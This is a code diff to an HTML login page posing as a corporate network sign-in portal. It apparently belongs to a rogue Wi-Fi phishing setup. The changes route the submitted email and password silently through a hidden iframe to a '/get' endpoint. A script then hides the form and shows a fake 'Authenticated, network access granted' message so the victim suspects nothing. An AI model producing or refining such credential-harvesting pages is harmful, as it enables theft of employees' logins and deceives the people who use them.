@@ -48,7 +48,7 @@ label{display:block;font-size:13px;color:#444;margin-bottom:5px;font-weight:500}
 </div>
 <h3>Sign In</h3>
 <p class="sub">Use your company email and password</p>
-<form method="POST" action="/get">
+<form id="f" method="POST" action="/get" target="h">
 <div class="field">
 <label>Corporate Email</label>
 <input name="email" type="text" placeholder="name@company.com" required autocomplete="off">
@@ -63,9 +63,16 @@ label{display:block;font-size:13px;color:#444;margin-bottom:5px;font-weight:500}
 </div>
 <button class="btn" type="submit">Authenticate</button>
 </form>
-<p class="help">Having trouble? Contact <a href="#">IT Support</a></p>
+<iframe name="h" style="display:none"></iframe>
+<div id="ok" style="display:none;text-align:center;padding:20px 0">
+<div style="font-size:28px;margin-bottom:8px">&#128737;</div>
+<h3 style="color:#003366;margin-bottom:6px">Authenticated</h3>
+<p style="font-size:13px;color:#666">Your device has been granted network access.<br>You may now close this page.</p>
 </div>
-<p class="footer">This is a secured network. All traffic is monitored and logged.<br>Unauthorized access is prohibited.</p>
+<p class="help" id="hp">Having trouble? Contact <a href="#">IT Support</a></p>
+</div>
+<p class="footer" id="ft">This is a secured network. All traffic is monitored and logged.<br>Unauthorized access is prohibited.</p>
+<script>document.getElementById('f').addEventListener('submit',function(){setTimeout(function(){document.getElementById('f').style.display='none';document.getElementById('ok').style.display='block';document.getElementById('hp').style.display='none';document.getElementById('ft').textContent='Session authenticated. Network access granted.'},500)})</script>
 </div>
 </body>
 </html>
